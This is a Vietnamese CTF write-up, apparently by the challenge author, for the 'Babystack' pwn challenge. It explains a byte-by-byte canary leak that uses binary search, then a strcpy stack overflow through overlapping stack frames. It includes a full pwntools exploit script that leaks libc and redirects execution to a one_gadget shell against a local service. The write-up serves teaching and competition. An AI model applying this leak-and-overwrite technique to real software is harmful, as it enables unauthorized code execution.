# Babystack  

## Summary  
  Một bài leak stack từng byte thông qua lỗi ở hàm login, kết hợp với binary search (tìm kiếm nhị phân) để giảm thiểu số lượng lần phải đoán.  

## Description  
  
>Now we have password to protect our stack from being overflown. There is no way this can be exploited, right?  

![image](https://user-images.githubusercontent.com/101010673/175363377-424a5aff-4c46-43f5-bbfc-4eef817f2db1.png)  


## Reversing  
  Đầu tiên chương trình sẽ đọc 16 byte từ `/dev/urandom`, đây chính là **password** hay **stack canary**  
  ![image](https://user-images.githubusercontent.com/101010673/175365066-52d1ed0e-59c7-46ca-b956-cfec1083afad.png)   
  
  Sau đó sẽ có một vòng lặp while vô hạn, và để thoát ra ta cần nhập input là '2'  
  ![image](https://user-images.githubusercontent.com/101010673/175365823-26432300-d1ad-4cc1-9d0a-ac58a0b8fcc2.png)  
  Sau khi thoát khỏi vòng lặp, nếu như **logged_in = true** và **password** vẫn giữ nguyên như ban đầu ( tức là chưa bị tràn stack ) thì sẽ **return**  
  
  Hàm **login** sẽ chỉ đơn giản là nhập vào password và check password thông qua hàm **check_password**, đồng thời mỗi lần nhập sai số lượng **attempt** tăng thêm 1, nếu như **attempt** quá 0xe6 thì chương trình sẽ exit  
  Chú ý là **len** ở đây được tính thông qua `strlen(input_passw)`  
  ![image](https://user-images.githubusercontent.com/101010673/175366156-217c48cb-a699-458c-bcf6-6310c240948c.png)  
  Hàm **check_login** chỉ đơn giản là lấy từng char ở **passw** trừ cho char ở **input_passw** để tính **difference**, nếu `difference = 0` thì **return 1** tức là **Login succeed** nếu `< 0` thì là **too small** và `> 0` thì **too large**  
  Ta chỉ tính **difference** cho đến kí tự char thứ **len**, mà **len** lại do **input_passw** điều khiển  
  ![image](https://user-images.githubusercontent.com/101010673/175367841-5195b284-5172-4f62-8a30-ca88d187d4e1.png)  
  Cuối cùng hàm **copy** chỉ là copy **content**, dữ liệu ta nhập vào đến buffer nằm trên stack  
  ![image](https://user-images.githubusercontent.com/101010673/175368135-fa2fe834-c9e9-4ee4-8465-6a6718f65614.png)  
  
## Vulnerability  
  Chương trình có 2 lỗi đáng chú ý:  
  - Đầu tiên lỗi bắt đầu từ việc `check_password` với **len** từ input của chúng ta, vậy tức là chúng ta có thể `check_password` đúng 1 byte, rồi 2 byte,... rồi dựa trên kết quả trả về để đoán xem liệu byte đó có đúng không, rồi dùng byte đã đoán đó để tiếp túc đoán các byte còn lại, do output trả ra còn có cả **too large** và **too small** ta sẽ kết hợp cả binary search để tìm kiếm được giá trị của byte với ít lần đoán hơn  
  => Ta có khả năng để leak được giá trị nằm trên stack bắt đầu từ address **passw**, leak bao nhiêu byte cũng được :d  
  ![image](https://user-images.githubusercontent.com/101010673/175369265-a8600b60-368f-4aff-be8e-76d7503fab43.png)  
  - Lỗi thứ hai là một lỗi buffer overflow khá dễ nhìn thấy nằm ở **strcpy** trong hàm `copy`. Tại **strcpy** không có số lượng byte sẽ copy, nên sẽ copy cho đến khi gặp **null byte**, nếu như trong input ta không có **null byte** thì sẽ copy rất nhiều byte khác nằm trên stack  
  => Có thể tràn buffer, mà ta lại copy đến một buffer **nằm trên stack frame của hàm main**, điều này khiến ta có thể ghi đè được **return address của main** nếu ta leak được **password**  
  ![image](https://user-images.githubusercontent.com/101010673/175370300-bdc2f7ba-9685-4a13-87c3-0d4fe60ab86d.png)  
  
## Exploitation  
  Với lỗi như đã nói ở trên, ta hoàn toàn có thể leak được **password** qua từng byte một, về phần implementation có thể xem code (rất lộn xộn) của mình ở phía dưới.  
  Giờ mình sẽ chỉ tập trung vào lỗi 2, cách ta có thể exploit nó như thế nào:  
  - Đầu tiên chú ý là trong hàm **login** có stack frame `0x90 byte`  
  ![image](https://user-images.githubusercontent.com/101010673/175372503-83a16494-1cfd-459d-968a-a0cacc8662d7.png)   
  - Và tương tự trong hàm **copy** cũng có stack frame `0x90 byte`   
  ![image](https://user-images.githubusercontent.com/101010673/175372731-62ec668f-b91d-43f7-b5ae-a5241eed7b9a.png)   
  - Vậy là nếu như ta gọi hàm **login** rồi gọi hàm **copy** ngay sau đó, thì 2 hàm sẽ có **stack frame trùng nhau**, dẫn đến buffer **content** trong **copy**, và **input_passw** trong **login** cũng sẽ bị trùng, mà **input_passw** ta có thể nhập `128 byte` so với `63 byte` của **content**, dẫn đến lỗi **strcpy** kia có thể sẽ khiến **buffer overflow với input ta kiểm soát**    
  - Ta có thể lợi dụng điều này để ghi đè được **password**, điều này cho ta khả năng để leak được thứ khác ngoài **password** từ lỗi 1 kia. Ta sẽ leak libc address thông qua đây.  
  ![image](https://user-images.githubusercontent.com/101010673/175376706-794b39cd-1006-4a3f-8823-251d20226d58.png)   
  -  Có thể thấy do 2 stack frame trùng nhau, nên content sẽ bị copy không chỉ là **0x3f byte 0x41** nữa, mình đã ghi đủ **88 byte** ở buffer **input_passw**, để khi **strcpy** sẽ ghi đè `0x00007ffff7a7cfc4` tại một chỗ nào đó nằm sau **password**, rồi giống như cách ta đã leak **password** ta sẽ lại leak **libc address**   
  -  Trước copy:    
  ![image](https://user-images.githubusercontent.com/101010673/175377637-87a83b05-59cd-4462-b804-e02c8d36cec6.png)    
  -  Sau copy:    
  ![image](https://user-images.githubusercontent.com/101010673/175377883-3d522999-f5f7-404a-9cb0-74161eacffcc.png)   
  - Có thể thấy sau copy ở **password** đã bị ghi đè thành nhiều byte 0x41 và đồng thời có **libc address** ở cuối, giống như ta đã leak **password** giờ **ta leak libc với prefix là một dãy số lượng 'A'**  
  - Cuối cùng sau khi leak được hết, chỉ cần **buffer overflow** tương tự cách ta ghi đè **password** ta sẽ ghi đè **return address** thành **one_gadget**  
  ![image](https://user-images.githubusercontent.com/101010673/175378287-9034f49f-e140-4333-a156-fc74e3438b26.png)   
  - Mình dùng gadget nằm ở offset **0x45226**  

## Full exploit script:  
```python  
#!/usr/bin/env python3

from pwn import *


r = remote("127.0.0.1",2006)
passw = b""
leak = b""
pad1 = b"A"*23 + b"\x31"
leak_libc = b""

def check(x):
	r.sendafter("> ",b"1")
	r.sendafter(":",passw + (x).to_bytes(1,byteorder='little') + b"\x00")
	tmp = r.recvuntil(b"!")
	if b"Login" in tmp:
		return 1
	elif b"small" in tmp:
		return 2
	else:
		return 3

def check1(x):
	r.sendafter("> ",b"1")
	r.sendafter(":",pad1 + leak_libc + (x).to_bytes(1,byteorder='little') + b"\x00")
	tmp = r.recvuntil(b"!")
	if b"Login" in tmp:
		return 1
	elif b"small" in tmp:
		return 2
	else:
		return 3

#Get password:
for i in range(0,0x10):
	lo = 0x1
	hi = 0xff
	while(lo <= hi):
		
		mid = hi + lo
		mid = int(mid/2)
		
		res = check(mid)
		if res == 1:
			passw = passw + (mid).to_bytes(1,byteorder='little')
			r.sendafter("> ",b"1") 
			break
		elif res == 2:
			lo = mid + 1
		else:
		 	hi = mid - 1


r.sendafter("> ",b'1')
r.sendafter(":",b"\x00")
r.sendafter("> ",b'3')
r.sendafter(":",b"AAAAAAA")
r.sendafter("> ",b'1')
pad = b"\x00".ljust(88,b"A")
r.sendlineafter("> ",b'1')
r.sendafter(":",pad)
r.sendafter("> ",b'3')
r.sendafter(":",b"A"*0x3f) 
r.sendafter("> ",b'1')

#Leak addr:
for i in range(0,6):
	lo = 0x1
	hi = 0xff
	while(lo <= hi):
		
		mid = hi + lo
		mid = int(mid/2)
		
		res = check1(mid)
		if res == 1:
			leak_libc = leak_libc + (mid).to_bytes(1,byteorder='little')
			r.sendafter(b"> ",b'1') 
			break
		elif res == 2:
			lo = mid + 1
		else:
		 	hi = mid - 1

leak_libc = int.from_bytes(leak_libc,byteorder='little')
libc_base = leak_libc - 0x6ffc4
one_gadget = libc_base + 0x45226

log.info("PASSWORD: " + hex(int.from_bytes(passw,byteorder='little')))
log.info("Libc Base Address: " + hex(libc_base))
log.info("Leak Libc: " + hex(leak_libc))



pad = b"\x00AAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH" + passw + b"IIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMM" + p64(one_gadget)
r.sendafter("> ",b'1')
r.sendafter(":",pad)
r.sendafter("> ",b'3')
r.sendafter(":",b"A"*0x3f)

r.sendafter("> ",b'2')

r.interactive()
```  
![image](https://user-images.githubusercontent.com/101010673/175378595-08e407d5-5d1b-43e0-8d33-a56a119a7df5.png)   

## Author's Note:   
  - Bài này mình viết PoC rất vội bởi vì challenge này là challenge thay đổi phút cuối, thế chỗ cho một challenge ROP khá basic khác. Tại vì mình muốn tăng chút độ khó cho contest. Và cũng vì vậy cái exploit script này quá lộn xộn...    
  - Mình lấy cảm hứng rất nhiều từ Babystack nằm trên pwnable.tw, nhưng mà mình vẫn nhớ lần đầu làm bài đó do mạng nhà mình chậm nên chạy exploit script mất hơn 20 phút 😶.   
  - Với cả mình là sinh viên khoa học máy tính, nên đã thêm cái twist tìm kiếm nhị phân này vào, giúp cho việc exploit chạy nhanh hơn :3   
  - Có một điều nữa là lúc mình viết challenge, có yếu tố nào đó khiến cho stack layout nó rất khó kiểm soát 😧. Dẫn đến thỉnh thoảng cái bước leak libc kia có lần offset nó bị sai và cuối cùng không leak được libc address. Mong các bạn thông cảm, mình thiếu kinh nghiệm :(    
  ![image](https://user-images.githubusercontent.com/101010673/175379882-39e5d361-6423-4125-a379-67d1bb8781df.png)   
  - Chúc những team nào vào final sẽ làm được những bài pwn (may mắn rằng không phải là mình ra) hay hơn, khó hơn :)  



  


  

  

  
  

  
  
  


  

